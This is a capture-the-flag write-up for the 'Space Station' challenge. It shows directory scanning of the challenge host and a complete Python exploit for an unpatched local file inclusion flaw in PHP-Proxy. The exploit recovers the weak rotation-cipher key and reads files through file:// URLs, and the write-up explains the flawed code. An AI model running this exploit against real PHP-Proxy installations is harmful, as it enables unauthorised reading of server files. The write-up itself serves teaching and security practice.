<hr />

<h2>description: N-day Local File Inclusion (LFI) vulnerability in PHP-Proxy.</h2>

<h1>Space Station</h1>

<h2>Description</h2>

<p>Where do you want to go?</p>

<p><code>http://20.198.209.142:55047</code></p>

<p><em>The flag is in the flag format: STC{...}</em></p>

<p><strong>Author: zeyu2001</strong></p>

<h2>Solution</h2>

<p>Going to the given site only shows <code>Hello Mars!</code>.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.03.46 AM.png" alt="" /></p>

<p>Performing a simple directory busting scan, we find some interesting information.</p>

<p>```</p>

<h1>└─# gobuster dir -u http://20.198.209.142:55047/ -w /usr/share/dirb/wordlists/common.txt -k -x .txt,.php --threads 10</h1>

<p>Gobuster v3.0.1</p>

<h1>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@<em>FireFart</em>)</h1>

<p>[+] Url:            http://20.198.209.142:55047/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php</p>

<h1>[+] Timeout:        10s</h1>

<h1>2021/07/23 23:06:33 Starting gobuster</h1>

<p>/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.php (Status: 403)
/app (Status: 301)
/flag.txt (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)</p>

<h1>/server-status (Status: 403)</h1>

<h1>2021/07/23 23:06:52 Finished</h1>

<p>```</p>

<p>We find a <code>/flag.txt</code>, but we cannot view it. Let's keep in mind that the flag is in web root for now. </p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.09.17 AM.png" alt="" /></p>

<p>Going to <code>/app</code> gives us a web proxy application.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.11.57 AM.png" alt="" /></p>

<p>We can enter any URL, and the corresponding page will be rendered on our browser. At the bottom of the page, we find that this application is "Powered by PHP-Proxy" and a <a href="https://www.php-proxy.com">link</a> is given.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.14.36 AM.png" alt="" /></p>

<p>This link leads us to the GitHub repository, where a search for Issues containing the word "vulnerability" yields several results.</p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.15.00 AM.png" alt="" /></p>

<p>A currently open and unfixed issue is that PHP-Proxy (all versions) suffers from a Local File Inclusion (LFI) vulnerability: <a href="https://github.com/Athlon1600/php-proxy-app/issues/135">https://github.com/Athlon1600/php-proxy-app/issues/135</a>. We can also find more details here: <a href="https://github.com/0xUhaw/CVE-Bins/tree/master/PHP-Proxy">https://github.com/0xUhaw/CVE-Bins/tree/master/PHP-Proxy</a></p>

<h3>The Exploit</h3>

<p>The exploit script is already provided in the GitHub issue above.</p>

<p>```python
import requests
import base64</p>

<p>def encrypt(plaintext, key):
    key<em>length = len(key)
    key</em>as<em>int = [ord(i) for i in key]
    plaintext</em>int = [ord(i) for i in plaintext]
    ciphertext = []
    for i in range(len(plaintext<em>int)):
        value = (plaintext</em>int[i] + key<em>as</em>int[i % key_length]) % 256
        ciphertext.append(value)
    return bytes(ciphertext)</p>

<p>def calculate_key(ciphertext, plaintext):
    key = []
    for i in range(0, len(ciphertext)):
        if ciphertext[i] - ord(plaintext[i]) &lt; 0:
            key.append(chr(ciphertext[i] - ord(plaintext[i]) + 256))
        else:
            key.append(chr(ciphertext[i] - ord(plaintext[i])))</p>

<pre><code>return "".join(key[:32])
</code></pre>

<p>def exploit(url, file<em>to</em>read):
    r = requests.post(url + '/index.php', data={'url': 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'}, allow_redirects=False)</p>

<pre><code>b64_url_ciphertext = r.headers['location'].split('?q=')[1]
b64_url_ciphertext = b64_url_ciphertext + "=" * (len(b64_url_ciphertext) % 4)
url_ciphertext = base64.b64decode(b64_url_ciphertext)
url_plaintext = 'http://aaaaaaaaaaaaaaaaaaaaaaaaaaa.com'

key = calculate_key(url_ciphertext, url_plaintext)
return requests.get(url + '/index.php', params={'q': base64.b64encode(encrypt(file_to_read, key))}).text
</code></pre>

<p>print(exploit('http://20.198.209.142:55047/app', 'file:///var/www/html/flag.txt'))
```</p>

<p>Running the script gives us the flag, <code>STC{l0cal_f1l3_1nclus10n_328d47c2ac5b2389ddc47e5500d30e04}</code></p>

<p><img src="../../.gitbook/assets/Screenshot 2021-07-24 at 11.24.34 AM.png" alt="" /></p>

<p>To understand why the exploit works, read on below!</p>

<h3>The Vulnerability</h3>

<p>When visiting a page through PHP-Proxy, the <code>q=</code> parameter is used. This is the URL we are visiting, encrypted using an app key in the package configuration.</p>

<p>The encryption key is generated as follows:</p>

<p><code>php
Config::set('encryption_key', md5(Config::get('app_key').$_SERVER['REMOTE_ADDR']));
</code></p>

<p>The URL is encrypted as follows:</p>

<p><code>php
$url = str_rot_pass($url, $key);
</code></p>

<p>The following encryption function is not secure enough. It simply takes every character of the key and adds it to the original plaintext. Since we know both the plaintext (the original URL) and the ciphertext (the <code>q=</code> parameter), we can easily reverse-engineer the key.</p>

<p>```php
// rotate each string character based on corresponding ascii values from some key
function str<em>rot</em>pass($str, $key, $decrypt = false){</p>

<pre><code>// if key happens to be shorter than the data
$key_len = strlen($key);

$result = str_repeat(' ', strlen($str));

for($i=0; $i&lt;strlen($str); $i++){

    if($decrypt){
        $ascii = ord($str[$i]) - ord($key[$i % $key_len]);
    } else {
        $ascii = ord($str[$i]) + ord($key[$i % $key_len]);
    }

    $result[$i] = chr($ascii);
}

return $result;
</code></pre>

<p>}
```</p>

<p>Then, after getting the key, it is simply a matter of encrypting <code>file:///var/www/html/flag.txt</code> since the <code>file://</code> protocol is not explicitly banned.</p>
